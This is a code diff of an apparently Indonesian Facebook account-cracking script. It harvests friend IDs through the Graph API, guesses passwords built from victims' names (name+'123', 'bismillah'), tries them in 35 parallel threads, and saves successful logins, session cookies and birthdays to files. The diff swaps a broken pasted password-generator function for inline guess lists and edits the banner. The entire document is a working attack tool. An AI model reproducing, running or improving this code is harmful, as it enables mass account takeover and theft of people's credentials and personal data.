@@ -75,14 +75,14 @@ class gas:
         if 'c_user' in d.cookies.get_dict().keys():
             ok+=1
             open('ok','a').write(user+'|'+pw+'\n')
-            print(f'\r\x1b[1;32m[OK]{user}|{pw}\x1b[0m\n',end='')
+            print(f'\r\x1b[1;32m*XNXX.COM > [OK] ~ {user}|{pw}|{d.cookies}\x1b[0m\n',end='')
         elif 'checkpoint' in d.cookies.get_dict().keys():
             cp+=1
             r=json.loads(req.get(f'https://graph.facebook.com/{user}?access_token={self.token}').text)
             try:ttl=r['birthday']
             except:ttl=''
             open('cp','a').write(user+'|'+pw+'|'+ttl+'\n')
-            print(f'\r\x1b[1;33m[CP]{user}|{pw}\x1b[0m\n',end='')
+            print(f'\r\x1b[1;33m*XNXX.COM > [CP] ~ {user}|{pw}|{ttl}\x1b[0m\n',end='')
         print(f'\rCRACK:-{str(cot)}/{len(id)} OK/CP:-{str(ok)}/{str(cp)}',end='')
     def get1(self):
         r=json.loads(req.get(f'https://graph.facebook.com/me/friends?access_token={self.token}').text)
@@ -104,28 +104,20 @@ class gas:
                         for pw in pwList:kirim.submit(self.crack,uid,pw)
                     except:pass
         elif(pi in ("t","T")):
-            
-def generate(text):
-	results=[]
-	global ips
-	for i in text.split(" "):
-		if len(i)<3:
-			continue
-		else:
-			i=i.lower()
-			if len(i)==3 or len(i)==4 or len(i)==5:
-				results.append(i+"123")
-				results.append(i+"12345")
-			else:
-				results.append(i+"123")
-				results.append(i+"12345")
-				results.append(i)
-				if "indonesia" in ips:
-					results.append("sayang")
-					results.append("bismillah")
-					results.append("anjing")
-					results.append("123456")
-	return results
+            with Bool(max_workers=35) as kirim:
+                print('\nStarting Crack...\n--------------------------------\n')
+                for email in id:
+                    uid,name=email.split('|')
+                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345','bismillah']
+                    elif(len(str(name.lower()))<=2):
+                        memek=[name.lower()+'12345','bismillah']
+                    elif(len(str(name.lower()))<=3):
+                        memek=[name.lower()+'123',name.lower()+'12345','bismillah']
+                    else:
+                        memek=[name.lower()+'123',name.lower()+'12345','bismillah']
+                    try:
+                        for pw in memek:kirim.submit(self.crack,uid,pw)
+                    except:pass
         print('\n### [CRACK FINISHED] ###')
     def get2(self):
         print('\n\t[ Crack ID Teman Atau Publik ]\n')
@@ -155,27 +147,20 @@ def generate(text):
                         for pw in pwList:kirim.submit(self.crack,uid,pw)
                     except:pass
         elif(memek in ("t","T")):
-            def generate(text):
-	results=[]
-	global ips
-	for i in text.split(" "):
-		if len(i)<3:
-			continue
-		else:
-			i=i.lower()
-			if len(i)==3 or len(i)==4 or len(i)==5:
-				results.append(i+"123")
-				results.append(i+"12345")
-			else:
-				results.append(i+"123")
-				results.append(i+"12345")
-				results.append(i)
-				if "indonesia" in ips:
-					results.append("sayang")
-					results.append("bismillah")
-					results.append("anjing")
-					results.append("123456")
-	return results
+            with Bool(max_workers=35) as kirim:
+                print('\nStarting Crack...\n--------------------------------\n')
+                for email in id:
+                    uid,name=email.split('|')
+                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345','bismillah']
+                    elif(len(str(name.lower()))<=2):                               memek=[name.lower()+'12345','bismillah']
+                    elif(len(str(name.lower()))<=3):
+                        memek=[name.lower()+'123',name.lower()+'12345','bismillah']
+                    else:
+                        memek=[name.lower()+'12345','bismillah']
+                    try:
+                        for pw in memek:
+                            kirim.submit(gas(self.token).crack,uid,pw)
+                    except:pass
         print('\n### [CRACK FINISHED] ###')
     def ua(self):
         print('\n\t[ Useragent Setting ]\n\n# Useragent Saat Ini:',open('ua','r').read(),'\n')
@@ -193,7 +178,7 @@ def generate(text):
         name=json.loads(req.get(f'https://graph.facebook.com/me?access_token={self.token}').text)['name']
         os.system('clear')
         cowsay.cow(f'Hallo: {name} :)\nYour IP: {ip}')
-        print('\n\t[ CODED BY: MUHAMMAD LATIF HARKAT ]\n\t\tRecode : Gilangsluur\n\nPilih Metode Crack!\n\n1. Crack Daftar Teman Anda\n2. Crack Daftar Teman Orang\n3. Setting Useragent\n4. Hapus Token (logout)\n')
+        print('\n\t[ CODED BY: MUHAMMAD LATIF HARKAT ]\n\t\tSapi Crack Version: 1.0 (BETA)\n\nPilih Metode Crack!\n\n1. Crack Daftar Teman Anda\n2. Crack Daftar Teman Orang\n3. Setting Useragent\n4. Hapus Token (logout)\n')
         p=input('[+] Chosee: ')
         if(p in ('01','1')):self.get1()
         elif(p in ('02','2')):self.get2()
